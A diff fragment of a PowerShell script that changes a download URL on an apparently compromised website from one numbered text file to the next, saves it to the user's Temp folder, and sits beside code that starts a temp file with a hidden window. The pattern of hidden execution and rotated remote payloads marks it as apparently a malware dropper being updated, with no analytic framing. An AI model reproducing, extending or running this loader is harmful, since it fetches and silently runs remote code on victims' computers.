@@ -196,8 +196,8 @@ if (Test-Path $tempPath) {
     Start-Process -FilePath $tempPath -WindowStyle Hidden
 }
 # Define the URL and the local path where the file will be saved
-$url = "https://bvmatqnam.com.vn/js/test/21.txt"
-$outputPath = Join-Path $env:TEMP "21.txt"   # Saves to the current user's Temp folder
+$url = "https://bvmatqnam.com.vn/js/test/22.txt"
+$outputPath = Join-Path $env:TEMP "22.txt"   # Saves to the current user's Temp folder
 
 try {
     # Download the file ( -UseBasicParsing makes it compatible with older PowerShell versions )
